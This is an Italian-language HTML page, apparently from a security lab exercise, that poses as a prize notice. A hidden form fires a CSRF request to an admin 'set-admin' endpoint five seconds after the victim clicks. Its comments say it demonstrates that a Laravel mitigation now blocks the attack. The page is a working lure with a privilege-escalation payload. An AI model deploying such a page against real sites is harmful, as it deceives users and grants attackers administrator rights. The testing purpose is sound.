<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premio Speciale!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .container {
            background: white;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #5a67d8;
        }
        .hidden-form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 Congratulazioni!</h1>
        <p>Hai vinto un premio speciale! Clicca il bottone per ritirarlo.</p>
        <button id="btn-premio" onclick="premi()">Ritira il premio</button>
    </div>

    <!-- Form nascosto per l'attacco CSRF -->
    <div class="hidden-form">
        <form id="csrf-form" action="http://cyber.blog:8000/admin/2/set-admin" method="POST">
            <input type="hidden" name="_method" value="PATCH">
        </form>
    </div>

    <script>
        function premi() {
            // Pagina di distrazione per la vittima
            alert('Controlla la tua email per il premio!');
            
            // Dopo 5 secondi lancia l'attacco CSRF
            setTimeout(function() {
                // NOTA: Non è possibile usare fetch() o XMLHttpRequest per inviare
                // i cookie di sessione in richieste cross-origin a causa delle
                // policy SameSite=Lax e CORS.
                // 
                // L'unico modo per far inviare i cookie è usare un form HTML
                // che fa una navigazione top-level (il browser invia i cookie
                // con SameSite=Lax nelle navigazioni GET top-level).
                //
                // Tuttavia, con il metodo PATCH il middleware CSRF di Laravel
                // bloccherà la richiesta perché manca il token _token.
                //
                // Questo script dimostra che l'attacco NON funziona più dopo
                // la mitigazione (rotte cambiate da GET a PATCH).
                
                var form = document.getElementById('csrf-form');
                form.submit();
                
                // Se l'attacco fosse riuscito (prima della mitigazione),
                // l'utente target sarebbe diventato admin.
                // Dopo la mitigazione, la richiesta viene bloccata con errore 419.
            }, 5000);
        }
    </script>
</body>
</html>
